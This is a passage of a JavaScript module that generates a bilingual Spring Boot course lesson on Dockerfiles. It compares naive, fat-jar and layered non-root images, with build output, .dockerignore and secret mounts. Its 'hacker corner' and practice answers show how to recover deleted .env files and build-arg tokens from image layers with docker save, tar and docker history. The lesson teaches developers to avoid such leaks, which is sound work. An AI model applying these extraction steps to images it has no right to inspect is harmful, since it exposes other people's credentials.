/**
 * spring-boot/s17-docker-ci.mjs — Chương 17: Docker và CI (soạn 24/11/2026, agent sb).
 * Mọi output là chạy thật trên máy nhà: Docker 29.6.2 + BuildKit, eclipse-temurin:21-jre, maven:3.9-eclipse-temurin-21, Paketo Buildpacks,
 * PostgreSQL 16, Redis 7, registry:2, actionlint; dự án LabFlow (Spring Boot 4.1.2) của Chương 18 làm nền.
 * Mã: scratchpad/sb/lab/c17/{labflow, df (các Dockerfile so sánh), ci (workflow mẫu), mem, t (kịch bản đo), lab17 (đề + bộ chấm)}.
 * Output: ~/.rtq-sb/c17/o (thô ở o/raw, bản hiển thị ở o/web). Hằng MA.. / OUT.. sinh bằng tam/s17/build.sh + gen-ma.mjs.
 */
import { java, bash, sql, xml, yml, props, js, out, tl, giai } from './_chung.mjs';

// ===== Bài 17.1 =====
const MA171_NGAY = bash("# Bản \"chạy được là được\" — kiểu hay gặp trong đồ án sinh viên\nFROM maven:3.9-eclipse-temurin-21\nWORKDIR /app\nCOPY . .\nRUN mvn -B -q -DskipTests package\nCMD [\"java\", \"-jar\", \"target/labflow-api-1.0.0.jar\"]");
const OUT171_NGAY = out("$ ls -a          # thư mục dự án lúc build (Dockerfile.1-ngay KHÔNG có .dockerignore)\n.  ..  .dockerignore  .env  .env.example  .git  .github  .gitignore  compose.yaml  Dockerfile  pom.xml  src  target\n$ du -sh target .git\n69M\ttarget\n416K\t.git\n\n$ docker build --no-cache -f Dockerfile.1-ngay -t sb-c17-ngay:v1 .\n#3 transferring context: 72.32MB 0.4s done\n#6 [3/4] COPY . .\n#7 [4/4] RUN mvn -B -q -DskipTests package\n#7 DONE 69.3s\n⏱ 81.8 s\n\n# sửa MỘT dòng trong LabflowApplication.java rồi build lại (có cache)\n$ docker build -f Dockerfile.1-ngay -t sb-c17-ngay:v2 .\n#3 transferring context: 42.89kB 0.0s done\n#5 [2/4] WORKDIR /app  CACHED\n#7 [4/4] RUN mvn -B -q -DskipTests package\n#7 DONE 94.4s          ← COPY . . đã đổi ⇒ mọi bước sau chạy lại, Maven tải lại toàn bộ thư viện\n⏱ 104.7 s");
const OUT171_NGAY_RUN = out("$ docker history sb-c17-ngay:v2\n0B\t9 seconds ago\tCMD [\"java\" \"-jar\" \"target/labflow-api-1.0.0…\n216MB\t9 seconds ago\tRUN /bin/sh -c mvn -B -q -DskipTests package…\n73MB\tAbout a minute ago\tCOPY . . # buildkit\n0B\t3 minutes ago\tWORKDIR /app\n\n$ docker image ls sb-c17-ngay\nsb-c17-ngay   v1   1.34GB\nsb-c17-ngay   v2   1.34GB\n\n$ docker run --rm sb-c17-ngay:v1 sh -c \"id; ls -a; cut -c1-24 .env\"\nuid=0(root) gid=0(root) groups=0(root)\n. .. compose.yaml Dockerfile .dockerignore .env .env.example .git .github .gitignore pom.xml src target\nLABFLOW_DB_PASSWORD=•••••  (bài che giá trị; image in ra nguyên văn)\nLABFLOW_JWT_SECRET=•••••  (bài che giá trị; image in ra nguyên văn)\nLABFLOW_MANAGER_PASSWORD");
const MA171_FAT = bash("# Bản một tầng: build jar trên máy, chép cả khối jar vào image JRE\nFROM eclipse-temurin:21-jre\nWORKDIR /app\nCOPY target/labflow-api-1.0.0.jar app.jar\nENTRYPOINT [\"java\", \"-jar\", \"app.jar\"]");
const OUT171_FAT = out("$ mvn -q -DskipTests package && docker build -f Dockerfile.2-fatjar -t sb-c17-fat:v1 .\n$ (sửa một dòng Java) mvn -q -DskipTests package && docker build -f Dockerfile.2-fatjar -t sb-c17-fat:v2 .\n⏱ 7.3 s (Maven) + 4.7 s (docker build)\n$ docker history sb-c17-fat:v2\n0B\t4 seconds ago\tENTRYPOINT [\"java\" \"-jar\" \"app.jar\"]\n71.9MB\t4 seconds ago\tCOPY target/labflow-api-1.0.0.jar app.jar # …\n0B\t2 minutes ago\tWORKDIR /app\nlớp khác nhau giữa v1 và v2: 1 lớp — 71.9MB (cả khối jar, dù chỉ một lớp .class đổi)\n$ docker run --rm --entrypoint id sb-c17-fat:v1\nuid=0(root) gid=0(root) groups=0(root)");
const MA171_LOP = bash("# syntax=docker/dockerfile:1\n# ---- tầng 1: build bằng JDK + Maven (không đi vào image cuối) ----\nFROM maven:3.9-eclipse-temurin-21 AS build\nWORKDIR /src\nENV MAVEN_OPTS=\"-Xmx1g\"\nCOPY pom.xml .\nRUN --mount=type=cache,target=/root/.m2 mvn -B -q dependency:go-offline\nCOPY src ./src\nRUN --mount=type=cache,target=/root/.m2 mvn -B -q -DskipTests package \\\n && java -Djarmode=tools -jar target/labflow-api-1.0.0.jar extract --layers --launcher --destination /out\n\n# ---- tầng 2: chỉ JRE + các lớp của ứng dụng, chạy bằng user thường ----\nFROM eclipse-temurin:21-jre\nRUN useradd --system --uid 10001 labflow\nWORKDIR /app\n# thư viện ít đổi đứng trước, mã của bạn đứng sau ⇒ sửa một dòng Java chỉ build lại lớp cuối\nCOPY --from=build /out/dependencies/ ./\nCOPY --from=build /out/spring-boot-loader/ ./\nCOPY --from=build /out/snapshot-dependencies/ ./\nCOPY --from=build /out/application/ ./\nUSER labflow\nEXPOSE 8080\nENV JAVA_TOOL_OPTIONS=\"-XX:MaxRAMPercentage=75 -XX:+ExitOnOutOfMemoryError\"\nENTRYPOINT [\"java\", \"org.springframework.boot.loader.launch.JarLauncher\"]");
const OUT171_LOP = out("$ (sửa một dòng Java) docker build -t sb-c17-lop:v2 .\n#12 [build 4/6] RUN … mvn -B -q dependency:go-offline   CACHED   ← pom.xml không đổi\n#13 [build 5/6] COPY src ./src                           DONE 0.5s\n#14 [build 6/6] RUN … mvn -B -q -DskipTests package …    DONE 10.0s\n#15 [stage-1 4/7] COPY --from=build /out/dependencies/ ./          CACHED\n#16 [stage-1 5/7] COPY --from=build /out/spring-boot-loader/ ./    CACHED\n#19 [stage-1 6/7] COPY --from=build /out/snapshot-dependencies/ ./ CACHED\n#20 [stage-1 7/7] COPY --from=build /out/application/ ./           DONE\n⏱ 13.9 s\n$ docker history sb-c17-lop:v2\n279kB\t2 seconds ago\tCOPY /out/application/ ./ # buildkit\n0B\t51 minutes ago\tCOPY /out/snapshot-dependencies/ ./ # buildk…\n618kB\t51 minutes ago\tCOPY /out/spring-boot-loader/ ./ # buildkit\n71.9MB\t51 minutes ago\tCOPY /out/dependencies/ ./ # buildkit\nlớp khác nhau giữa v1 và v2: 1 lớp — 279kB\n$ docker run --rm --entrypoint id sb-c17-lop:v1\nuid=10001(labflow) gid=999(labflow) groups=999(labflow)");
const MA171_IGNORE = bash("# .dockerignore — những thứ không bao giờ được gửi cho Docker lúc build\ntarget/\n.git/\n.idea/\n*.iml\n.env\nsecrets/");
const MA171_LO = bash("# Trông có vẻ cẩn thận: dùng .env lúc build rồi xoá ngay\nFROM eclipse-temurin:21-jre\nWORKDIR /app\nCOPY .env /tmp/.env\nRUN set -a && . /tmp/.env && echo \"đã đọc cấu hình\" && rm /tmp/.env\nARG REGISTRY_TOKEN\nRUN echo \"kéo gói nội bộ bằng token\" && test -n \"$REGISTRY_TOKEN\"\nCOPY target/labflow-api-1.0.0.jar app.jar\nENTRYPOINT [\"java\", \"-jar\", \"app.jar\"]");
const OUT171_LO = out("$ docker build -f Dockerfile.3-lo --build-arg REGISTRY_TOKEN=$REGISTRY_TOKEN -t sb-c17-lo .\n#6 [3/6] COPY .env /tmp/.env\n#7 [4/6] RUN set -a && . /tmp/.env && echo \"đã đọc cấu hình\" && rm /tmp/.env\n#8 [5/6] RUN echo \"kéo gói nội bộ bằng token\" && test -n \"tok-demo-•••••\"\n#9 [6/6] COPY target/labflow-api-1.0.0.jar app.jar\n$ docker run --rm sb-c17-lo ls /tmp/.env\nls: cannot access '/tmp/.env': No such file or directory\n\n$ docker history --no-trunc sb-c17-lo | grep REGISTRY_TOKEN\nRUN |1 REGISTRY_TOKEN=tok-demo-••••• /bin/sh -c echo \"kéo gói nội bộ bằng token\" && test -n \"$REGISTRY\nARG REGISTRY_TOKEN=tok-demo-•••••\n\n$ docker save sb-c17-lo -o lo.tar && tar -xf lo.tar && (tìm tmp/.env trong từng lớp)\nlớp 15a36250306c6388d2…   ← lớp của bước COPY .env\nLABFLOW_DB_PASSWORD=•••••\nLABFLOW_JWT_SECRET=•••••\nLABFLOW_MANAGER_PASSWORD=•••••\n(bài che giá trị bằng •••••; lệnh in ra nguyên văn)");
const MA171_SECRET = bash("# syntax=docker/dockerfile:1\n# Đúng cách: bí mật chỉ được GẮN vào lúc RUN, không bao giờ thành một lớp\nFROM eclipse-temurin:21-jre\nWORKDIR /app\nRUN --mount=type=secret,id=dotenv,required=true set -a && . /run/secrets/dotenv && echo \"đã đọc cấu hình\"\nRUN --mount=type=secret,id=registry_token,env=REGISTRY_TOKEN echo \"kéo gói nội bộ bằng token\" && test -n \"$REGISTRY_TOKEN\"\nCOPY target/labflow-api-1.0.0.jar app.jar\nENTRYPOINT [\"java\", \"-jar\", \"app.jar\"]");
const OUT171_SECRET = out("$ docker build -f Dockerfile.4-secret --secret id=dotenv,src=.env \\\n    --secret id=registry_token,env=REGISTRY_TOKEN -t sb-c17-secret .\n#8 [stage-0 3/5] RUN --mount=type=secret,id=dotenv,required=true set -a && . /run/secrets/dotenv && echo \"đã đọc cấu hình\"\n#8 0.236 đã đọc cấu hình\n#9 [stage-0 4/5] RUN --mount=type=secret,id=registry_token,env=REGISTRY_TOKEN echo \"kéo gói nội bộ bằng token\" && test -n \"****\"\n#9 0.269 kéo gói nội bộ bằng token\n\n$ docker history --no-trunc sb-c17-secret | grep -c -E \"REGISTRY_TOKEN=tok|tok-demo\"\n0\n$ docker run --rm --entrypoint ls sb-c17-secret /run/secrets\nls: cannot access '/run/secrets': No such file or directory");
const OUT171_BP = out("$ mvn -DskipTests spring-boot:build-image -Dspring-boot.build-image.imageName=sb-c17-bp:1.0.0\n> Pulled builder image 'paketobuildpacks/builder-noble-java-tiny@sha256:96678722f0d6…'\n> Pulled run image 'paketobuildpacks/ubuntu-noble-run-tiny@sha256:34e5d3022769…'\n6 of 26 buildpacks participating\npaketo-buildpacks/bellsoft-liberica 11.10.6\npaketo-buildpacks/syft              2.44.1\npaketo-buildpacks/executable-jar    6.17.8\npaketo-buildpacks/spring-boot       5.41.0\nBellSoft Liberica JRE 21.0.13: Contributing to layer\nAdding layer 'paketo-buildpacks/bellsoft-liberica:helper'\nAdding layer 'paketo-buildpacks/bellsoft-liberica:java-security-properties'\nAdding layer 'paketo-buildpacks/bellsoft-liberica:jre'\nAdding layer 'paketo-buildpacks/executable-jar:classpath'\nAdding layer 'paketo-buildpacks/spring-boot:helper'\nAdding layer 'paketo-buildpacks/spring-boot:spring-cloud-bindings'\nAdding layer 'paketo-buildpacks/spring-boot:web-application-type'\nAdding cache layer 'paketo-buildpacks/syft:syft'\nAdding cache layer 'paketo-buildpacks/spring-boot:spring-cloud-bindings'\nSuccessfully built image 'docker.io/library/sb-c17-bp:1.0.0'\nBUILD SUCCESS\n⏱ 293 s (lần đầu: kéo builder 1.26GB + tải JRE)\n\n$ docker image ls sb-c17-bp\nsb-c17-bp   1.0.0   639MB   46 years ago\n$ docker inspect -f \"User={{.Config.User}} Created={{.Created}}\" sb-c17-bp:1.0.0\nUser=1002:1001 Created=1980-01-01T00:00:01Z\n$ docker run --rm --entrypoint id sb-c17-bp:1.0.0\nexec: \"id\": executable file not found in $PATH        ← ảnh chạy không có shell, không có công cụ\n\n$ docker run --rm --memory 1g sb-c17-bp:1.0.0\nCalculated JVM Memory Configuration: -XX:MaxDirectMemorySize=10M -Xmx400197K -XX:MaxMetaspaceSize=136378K -XX:ReservedCodeCacheSize=240M -Xss1M (Total Memory: 1G, Thread Count: 250, Loaded Class Count: 21664, Headroom: 0%)");

const L171_EN = `
<div class="ml-en">
<span class="eyebrow">Chapter 17 · Lesson 17.1 · Docker and CI</span>
<h2>A Dockerfile for a Spring Boot app</h2>
<p class="lead">"It works on my machine" stops being an excuse the day your API ships as an image. This lesson builds the same LabFlow API (the capstone of Chapter 18) three ways — the Dockerfile most student projects start with, a one-stage fat-jar image, and a multi-stage layered image — and measures what each costs: image size, the time to rebuild after changing one line, how many megabytes every release pushes, which user the process runs as, and which secrets accidentally travel inside. Then it shows the two ways a secret leaks through a Dockerfile that "deletes" it, the correct way, and Cloud Native Buildpacks as the no-Dockerfile option.</p>

<h3>Everyday picture first</h3>
<p>You are sending a cake to a friend in another city. You can ship the whole kitchen — oven, flour sacks, the dirty bowls and the note with your bank PIN stuck on the fridge — or you can bake at home and ship only the cake in a box. A Docker image is the box. The naive Dockerfile ships the kitchen. A multi-stage build bakes in one place, then throws the kitchen away. And a layered image is a box with drawers: the plate and the candles (libraries) never change, so next time you only send a new slice (your code).</p>

<h3>1. Version A — the Dockerfile that "just works"</h3>
${MA171_NGAY}
<p>It builds, it runs, and it is what you will find in many repositories. Built for real on LabFlow, with no <code>.dockerignore</code>:</p>
${OUT171_NGAY}
${OUT171_NGAY_RUN}
<ul>
  <li><strong>1.34 GB</strong>: the image contains Maven, a full JDK, the downloaded dependencies (the 216 MB layer) and the whole project folder (73 MB, including <code>target/</code> and <code>.git/</code>).</li>
  <li><strong>Every code change re-downloads the internet.</strong> <code>COPY . .</code> comes before <code>mvn package</code>, so a one-line change invalidates the layer cache and Maven fetches every dependency again: 104.7 s for a one-line fix.</li>
  <li><strong>It runs as root</strong> (<code>uid=0</code>).</li>
  <li><strong>The <code>.env</code> file with the database password and the JWT signing key is inside the image.</strong> Anyone who can pull the image can read it. <code>.gitignore</code> kept it out of Git; nothing kept it out of Docker.</li>
</ul>

<h3>2. Version B — fat jar on a JRE</h3>
${MA171_FAT}
${OUT171_FAT}
<p>Much better: no Maven, no JDK, no source code in the image. But the whole 71.9 MB jar is a single layer. Change one class and every release uploads 71.9 MB to the registry and every server downloads 71.9 MB — for a change of a few hundred bytes. And it still runs as root.</p>

<h3>3. Version C — multi-stage, layered, not root</h3>
<p>This is the Dockerfile LabFlow actually uses (Chapter 18):</p>
${MA171_LOP}
${OUT171_LOP}
<ul>
  <li><strong>Two stages.</strong> Stage <code>build</code> has the JDK and Maven; the final stage starts again <code>FROM eclipse-temurin:21-jre</code> and copies only the result. Nothing from stage one ships except what you <code>COPY --from</code>.</li>
  <li><strong><code>COPY pom.xml</code> then <code>dependency:go-offline</code> before <code>COPY src</code>.</strong> Docker's cache rule: a step re-runs if its inputs changed or any step above it re-ran. Dependencies depend only on <code>pom.xml</code>, so they are resolved once and cached until the POM changes.</li>
  <li><strong><code>RUN --mount=type=cache,target=/root/.m2</code></strong>: a BuildKit cache that survives between builds but is never part of the image. Even when the POM does change, Maven downloads only what is new.</li>
  <li><strong>Layered jar.</strong> <code>java -Djarmode=tools -jar app.jar extract --layers --launcher</code> splits the Spring Boot jar into four folders listed in its <code>BOOT-INF/layers.idx</code>: <code>dependencies</code> (71.9 MB, changes when the POM changes), <code>spring-boot-loader</code> (618 kB), <code>snapshot-dependencies</code> (empty here) and <code>application</code> (279 kB, your classes and resources). Each is a separate <code>COPY</code>, so a separate layer, ordered from "rarely changes" to "changes every commit".</li>
  <li><strong>Result</strong>: one line of Java ⇒ one new layer of <strong>279 kB</strong>. The registry and every server already have the other 72 MB.</li>
  <li><strong><code>USER labflow</code></strong> with a fixed uid (10001): the process is not root inside the container.</li>
  <li><strong><code>JAVA_TOOL_OPTIONS=-XX:MaxRAMPercentage=75</code></strong>: lesson 17.2 measures why this line matters.</li>
</ul>
<div class="callout info"><p><strong>A surprise from the first run.</strong> The first time we "changed one line", the change was a comment. Result: <code>lớp mới v1→v2: 0</code> — zero new layers. A comment on the same line produces byte-for-byte identical <code>.class</code> files, the extracted <code>application/</code> folder had the same checksum, and BuildKit reused the cached layer. The fat jar still produced a new 71.9 MB layer for the same edit, because a rebuilt jar is a new zip file. Layers are keyed on content, not on your intent.</p></div>

<h3>4. <code>.dockerignore</code>: what never leaves your machine</h3>
${MA171_IGNORE}
<p>Docker sends the build context (the folder after the dot in <code>docker build … .</code>) to the builder before the first step runs. Without this file version A sent 72.32 MB, including <code>.env</code> and <code>.git</code>. With it, <code>target/</code>, <code>.git/</code> and <code>.env</code> cannot end up in any layer, whatever a future <code>COPY</code> line says. Rule of thumb: <code>.gitignore</code> protects your repository, <code>.dockerignore</code> protects your image — you need both.</p>

<h3>5. Choosing the base image</h3>
<table>
  <thead><tr><th>Base</th><th>What you get</th><th>When</th></tr></thead>
  <tbody>
    <tr><td><code>maven:3.9-eclipse-temurin-21</code> / <code>eclipse-temurin:21-jdk</code></td><td>Compiler, Maven, tools (the JDK image alone is 751 MB on this machine)</td><td>Only in the <em>build</em> stage</td></tr>
    <tr><td><code>eclipse-temurin:21-jre</code></td><td>Ubuntu + a JRE; has a shell and <code>curl</code> (useful for a healthcheck, lesson 17.2)</td><td>Default choice for LabFlow</td></tr>
    <tr><td><code>…-jre-alpine</code></td><td>Smaller, but musl instead of glibc</td><td>When you have tested native libraries and DNS behaviour on musl</td></tr>
    <tr><td>Distroless / Buildpacks "tiny"</td><td>No shell, no package manager</td><td>Smallest attack surface; debug with <code>docker debug</code> or an ephemeral container</td></tr>
  </tbody>
</table>
<p>Pin the base by tag (<code>21-jre</code>) and let a bot (Dependabot, lesson 17.3) propose updates; pinning by digest (<code>@sha256:…</code>) makes builds reproducible but means security fixes only arrive when you bump it.</p>

<h3>6. Not root — why one line matters</h3>
<p>A container is not a virtual machine: it is a process on the host kernel with namespaces around it. In February 2019, <strong>CVE-2019-5736</strong> showed that a process running as root inside a container could overwrite the host's <code>runc</code> binary and get root on the host the next time anyone ran <code>docker exec</code>. The attack needed root inside the container. Every image you ship should end with a <code>USER</code> line using a numeric uid (Kubernetes' <code>runAsNonRoot</code> can only verify numeric uids). Version A and B: <code>uid=0(root)</code>; version C: <code>uid=10001(labflow)</code>.</p>

<h3>7. 🕵️ Hacker corner — the secret you "deleted"</h3>
<p>A real pattern: a build needs a password (a private Maven repository, a database to generate code from), so the Dockerfile copies <code>.env</code>, uses it and removes it; a token is passed with <code>--build-arg</code>:</p>
${MA171_LO}
${OUT171_LO}
<p><code>ls</code> says the file is gone, and it is gone from the <em>last</em> layer. But every layer is a tar archive stored forever in the image: <code>docker save</code> plus <code>tar</code> recovers the full <code>.env</code> from the layer of the <code>COPY</code> step. And a build argument used by <code>RUN</code> is recorded in the image history in plain text — it was also printed in the build log, which in CI is often readable by everyone in the project.</p>
<p>This is not theoretical. Researchers at RWTH Aachen scanned 337,171 public images on Docker Hub and private registries and published the results in 2023: about 8.5% contained secrets — private keys and API secrets — many of them still in use on live servers.</p>
<p><strong>The fix: secret mounts.</strong> The secret is mounted into one <code>RUN</code> step as a temporary file (or an environment variable) and never becomes part of a layer; BuildKit even masks it in the log:</p>
${MA171_SECRET}
${OUT171_SECRET}
<div class="callout warn"><p><strong>If a secret has already shipped</strong>, deleting the image tag is not enough: someone may already have pulled it, and the layer may be cached in registries and on servers. Rotate the secret (new password, new key), then clean up. Runtime secrets (the DB password LabFlow needs while running) do not belong in the image at all — they come from the environment or mounted files at <code>docker run</code> time (lesson 17.2).</p></div>

<h3>8. No Dockerfile at all: Cloud Native Buildpacks</h3>
<p>Spring Boot's Maven plugin can build an image without a Dockerfile, using Paketo Buildpacks:</p>
${OUT171_BP}
<ul>
  <li>The buildpacks detected a Java app, chose a JRE (BellSoft Liberica 21), applied the same layered-jar idea, generated an SBOM (syft) and set a non-root user (<code>1002:1001</code>).</li>
  <li><strong>"46 years ago"</strong> is deliberate: the creation date is fixed to 1980-01-01 so the same input gives the same image digest (reproducible builds).</li>
  <li>The run image has <strong>no shell</strong>: <code>id</code> does not exist. Less for an attacker to use — and no <code>curl</code> for a healthcheck.</li>
  <li>A <strong>memory calculator</strong> sizes the heap at start: with a 1 GB limit it chose <code>-Xmx400197K</code> (≈ 391 MB) after reserving room for metaspace, code cache and 250 thread stacks — more conservative than <code>MaxRAMPercentage=75</code> (lesson 17.2).</li>
  <li>The first build took 293 s (pulling a 1.26 GB builder and downloading the JRE); later builds reuse a cache volume.</li>
</ul>
<table>
  <thead><tr><th></th><th>Own Dockerfile (version C)</th><th>Buildpacks</th></tr></thead>
  <tbody>
    <tr><td>Control</td><td>Every line is yours</td><td>Configured with <code>BP_*</code> variables</td></tr>
    <tr><td>Base updates</td><td>Edit <code>FROM</code>, rebuild</td><td>"rebase" swaps the OS layers without rebuilding the app</td></tr>
    <tr><td>Good for</td><td>A team that wants to read and review the build; student projects</td><td>Many services built the same way across a company</td></tr>
  </tbody>
</table>

<h3>Compared with Node.js</h3>
<p>The Node.js course measures the same ideas on an Express app — image size, layer cache order, secrets in layers (lessons 17.1, 17.2 and 17.4 of the <a href="/courses/nodejs/learn">Node.js course</a>). Two differences are specific to Java: the output is one jar that must be <em>extracted</em> into layers to get the caching benefit (Node's <code>node_modules</code> is already a separate folder), and the runtime is a JVM, so the base image choice is "which JRE", and memory settings need care (17.2).</p>

<h3>At work</h3>
<p>In an outsourcing team the Dockerfile is reviewed like code. Typical review comments you will write or receive: "<code>COPY . .</code> before dependency resolution — move it down", "missing <code>.dockerignore</code>", "runs as root", "secret passed with <code>--build-arg</code>". A CI pipeline (17.3) often adds a scanner that fails the build on these.</p>

<h3>🎤 What the interviewer will ask</h3>
<ol>
  <li><strong>"Why a multi-stage build for Spring Boot?"</strong> — The build needs a JDK and Maven; the runtime needs only a JRE and the jar. Multi-stage keeps tools and source out of the shipped image (smaller, fewer vulnerabilities) and lets the build stage cache dependencies.</li>
  <li><strong>"What is a layered jar and what does it buy you?"</strong> — Spring Boot can split the fat jar into dependencies, loader, snapshot dependencies and application. Copied as separate layers, a code change ships one small layer (279 kB here) instead of the whole 72 MB jar.</li>
  <li><strong>"How do you pass a secret to a Docker build?"</strong> — <code>RUN --mount=type=secret</code>. Not <code>ARG</code>/<code>ENV</code> (stored in history), not <code>COPY</code> + <code>rm</code> (still in the earlier layer). Runtime secrets come at run time, never in the image.</li>
  <li><strong>"Why not run as root in a container?"</strong> — A container shares the host kernel; root inside plus one runtime bug (CVE-2019-5736) becomes root on the host. Use <code>USER</code> with a numeric uid.</li>
  <li><strong>"Dockerfile or Buildpacks?"</strong> — Buildpacks give safe defaults with no file to maintain and can rebase OS layers; a Dockerfile gives full control and is easy to review. Either is fine if the result is layered, non-root and secret-free.</li>
</ol>

<h3>🧪 Practice (30 minutes)</h3>
<div class="callout ok"><ol>
  <li>Build version A of your own project (or LabFlow) and run <code>docker run --rm &lt;image&gt; ls -a</code>. List everything inside that should not be there.</li>
  <li>Add a <code>.dockerignore</code>, convert to a multi-stage layered Dockerfile, then change one string literal in a controller and rebuild. How many layers changed and how big is the new one? Now change only a comment — predict first, then measure.</li>
  <li>Build an image that copies a file <code>secret.txt</code> and deletes it in the next step. Recover the file from <code>docker save</code> without running the container.</li>
</ol></div>
${giai('Show the answers', `<p>1. In LabFlow: <code>.env</code> (with real secrets), <code>.git</code>, <code>target/</code>, the whole <code>src/</code>, Maven and the JDK. The process runs as <code>uid=0</code>.</p><p>2. One layer, the <code>application/</code> layer, a few hundred kB (279 kB for LabFlow). A comment-only change: zero new layers, because the compiled classes are identical and BuildKit caches by content. If you see the 72 MB dependencies layer change, your <code>COPY</code> order or your POM changed.</p><p>3. <code>docker save img -o img.tar &amp;&amp; mkdir x &amp;&amp; tar -xf img.tar -C x</code>, then for each file in <code>x/blobs/sha256/</code> run <code>tar -tf</code> and look for <code>secret.txt</code>; <code>tar -xOf &lt;layer&gt; secret.txt</code> prints it. The <code>rm</code> only adds a "whiteout" marker in a later layer.</p>`)}

<h3>🗂 Key terms</h3>
<ul>
  <li><strong>Build context</strong> — the files sent to the builder; filtered by <code>.dockerignore</code>.</li>
  <li><strong>Layer</strong> — a tar archive of filesystem changes made by one Dockerfile step; cached by content and shared between images.</li>
  <li><strong>Multi-stage build</strong> — several <code>FROM</code> stages in one Dockerfile; only the last stage ships.</li>
  <li><strong>Layered jar</strong> — Spring Boot jar split by <code>layers.idx</code> into dependencies / loader / snapshot-dependencies / application.</li>
  <li><strong>Cache mount</strong> — <code>RUN --mount=type=cache</code>: a folder kept between builds but never in the image.</li>
  <li><strong>Secret mount</strong> — <code>RUN --mount=type=secret</code>: a secret visible to one step only, never stored.</li>
  <li><strong>Buildpacks</strong> — tools that turn source or a jar into an image without a Dockerfile (Paketo for Spring Boot).</li>
  <li><strong>Reproducible build</strong> — same input, same image digest (Buildpacks fix the date to 1980).</li>
</ul>

<h3>📌 Summary</h3>
<ul>
  <li>Naive Dockerfile on LabFlow: 1.34 GB, root, <code>.env</code> and <code>.git</code> inside, 104.7 s to rebuild after one line.</li>
  <li>Fat jar on a JRE: no tools, but 71.9 MB to push per release, still root.</li>
  <li>Multi-stage + layered + <code>USER</code>: one line ⇒ one 279 kB layer; <code>uid=10001</code>.</li>
  <li><code>COPY</code> + <code>rm</code> and <code>--build-arg</code> both leak; use secret mounts, rotate anything that already shipped.</li>
  <li>Buildpacks: no Dockerfile, non-root, no shell, reproducible, a memory calculator; slower first build.</li>
</ul>

<h3>📚 Go deeper</h3>
${tl('https://docs.spring.io/spring-boot/reference/packaging/container-images/efficient-images.html', '🧱', 'Spring Boot — Efficient container images', 'Layering, layers.idx, extracting the jar.')}
${tl('https://docs.spring.io/spring-boot/maven-plugin/build-image.html', '📦', 'Spring Boot Maven plugin — build-image', 'Buildpacks options, BP_* variables.')}
${tl('https://docs.docker.com/build/building/secrets/', '🔑', 'Docker — Build secrets', 'Secret mounts, env= targets.')}
${tl('https://docs.docker.com/build/cache/', '⚡', 'Docker — Build cache', 'How invalidation works, cache mounts.')}

<h3>Sources</h3>
<ul>
  <li>CVE-2019-5736 (runc container breakout), NVD, February 2019.</li>
  <li>M. Dahlmanns et al., "Secrets Revealed in Container Images: An Internet-wide Study on Occurrence and Impact", ACM ASIA CCS 2023 (RWTH Aachen).</li>
  <li>All measurements: LabFlow on this course's build machine, Docker 29.6.2, November 2026.</li>
</ul>
</div>
`;

const L171_VI = `
<div class="ml-vi">
<span class="eyebrow">Chương 17 · Bài 17.1 · Docker và CI</span>
<h2>Dockerfile cho ứng dụng Spring Boot</h2>
<p class="lead">"Máy em chạy được mà" hết là lý do vào ngày API của bạn được giao đi dưới dạng image. Bài này build cùng một API LabFlow (dự án cuối khoá ở Chương 18) theo ba cách — Dockerfile mà phần lớn đồ án sinh viên bắt đầu, image fat jar một tầng, và image nhiều tầng chia lớp — rồi đo cái giá của từng cách: cỡ image, thời gian build lại sau khi sửa một dòng, mỗi lần phát hành phải đẩy bao nhiêu MB, tiến trình chạy bằng user nào, và bí mật nào vô tình đi theo. Sau đó là hai cách một bí mật lọt qua Dockerfile dù đã "xoá", cách đúng, và Cloud Native Buildpacks — lựa chọn không cần Dockerfile.</p>

<h3>Đời thường trước đã</h3>
<p>Bạn gửi một cái bánh cho bạn ở thành phố khác. Bạn có thể gửi cả căn bếp — lò nướng, bao bột, mấy cái bát bẩn và tờ giấy ghi mã PIN ngân hàng dán trên tủ lạnh — hoặc nướng ở nhà rồi chỉ gửi cái bánh trong hộp. Image Docker chính là cái hộp. Dockerfile ngây thơ gửi cả căn bếp. Build nhiều tầng thì nướng ở một chỗ rồi bỏ căn bếp lại. Còn image chia lớp là cái hộp có ngăn: đĩa và nến (thư viện) không bao giờ đổi, lần sau bạn chỉ gửi miếng bánh mới (mã của bạn).</p>

<h3>1. Bản A — Dockerfile "chạy được là được"</h3>
${MA171_NGAY}
<p>Nó build được, chạy được, và bạn sẽ gặp nó ở rất nhiều repo. Build thật với LabFlow, không có <code>.dockerignore</code>:</p>
${OUT171_NGAY}
${OUT171_NGAY_RUN}
<ul>
  <li><strong>1,34 GB</strong>: image chứa Maven, nguyên một JDK, thư viện đã tải (lớp 216 MB) và cả thư mục dự án (73 MB, có cả <code>target/</code> lẫn <code>.git/</code>).</li>
  <li><strong>Mỗi lần sửa mã là tải lại cả thế giới.</strong> <code>COPY . .</code> đứng trước <code>mvn package</code>, nên sửa một dòng làm mất cache của lớp đó và Maven tải lại mọi thư viện: 104,7 giây cho một dòng sửa.</li>
  <li><strong>Chạy bằng root</strong> (<code>uid=0</code>).</li>
  <li><strong>Tệp <code>.env</code> chứa mật khẩu CSDL và khoá ký JWT nằm ngay trong image.</strong> Ai kéo được image là đọc được. <code>.gitignore</code> giữ nó khỏi Git; không có gì giữ nó khỏi Docker.</li>
</ul>

<h3>2. Bản B — fat jar trên JRE</h3>
${MA171_FAT}
${OUT171_FAT}
<p>Tốt hơn nhiều: không Maven, không JDK, không mã nguồn trong image. Nhưng cả khối jar 71,9 MB là một lớp duy nhất. Sửa một lớp Java là mỗi lần phát hành đẩy 71,9 MB lên registry và mỗi máy chủ kéo về 71,9 MB — cho một thay đổi vài trăm byte. Và vẫn chạy bằng root.</p>

<h3>3. Bản C — nhiều tầng, chia lớp, không root</h3>
<p>Đây là Dockerfile LabFlow dùng thật (Chương 18):</p>
${MA171_LOP}
${OUT171_LOP}
<ul>
  <li><strong>Hai tầng.</strong> Tầng <code>build</code> có JDK và Maven; tầng cuối bắt đầu lại <code>FROM eclipse-temurin:21-jre</code> và chỉ chép kết quả sang. Không gì của tầng một đi theo, trừ thứ bạn <code>COPY --from</code>.</li>
  <li><strong><code>COPY pom.xml</code> rồi <code>dependency:go-offline</code> trước <code>COPY src</code>.</strong> Luật cache của Docker: một bước chạy lại nếu đầu vào của nó đổi hoặc có bước phía trên đã chạy lại. Thư viện chỉ phụ thuộc <code>pom.xml</code>, nên được tải một lần và nằm trong cache tới khi POM đổi.</li>
  <li><strong><code>RUN --mount=type=cache,target=/root/.m2</code></strong>: một cache của BuildKit sống qua các lần build nhưng không bao giờ thuộc image. Kể cả khi POM đổi, Maven chỉ tải phần mới.</li>
